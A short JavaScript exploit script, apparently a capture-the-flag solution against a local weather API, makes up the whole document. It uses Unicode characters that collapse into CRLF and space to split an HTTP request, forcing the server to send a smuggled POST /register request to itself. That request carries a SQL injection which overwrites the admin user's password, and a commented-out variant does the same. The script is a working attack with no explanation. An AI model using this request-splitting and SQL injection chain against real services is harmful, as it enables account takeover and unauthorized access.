const host = 'http://localhost:1337'
//const injection = "bar'); update users set password='foo' where username='admin' --";
const injection = "'),('admin', 'foo') on conflict(username) do update set password='foo'--";
const crlf = '\u{010D}\u{010A}'
const space = '\u{0120}'
const query = `username=foo&password=${encodeURIComponent(injection)}`;
let payload = [
  `x${space}HTTP/1.1`,
  `Host:${space}127.0.0.1:80${crlf}`,
  `POST${space}/register${space}HTTP/1.1`,
  `Host:${space}127.0.0.1:80`,
  'Content-Type:'+space+'application/x-www-form-urlencoded',
  `Content-Length:${space}${query.length+24}`,
  '',
  query
];
payload = payload.join(crlf);
console.log(payload);
console.log(encodeURIComponent(payload))
console.log(Buffer.from(payload, 'latin1').toString('latin1'))
const params = {
  endpoint: encodeURIComponent('127.0.0.1:80'),
  city: encodeURIComponent(payload),
  country: 'placeholder'
};
const {endpoint,city,country} = params;
const qs = `endpoint=${endpoint}&city=${city}&country=${country}`;
console.log(qs);
(async () => {
  const res = await fetch(host+'/api/weather', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: qs 
  }).then(r => r.text());
  console.log(res)
})();
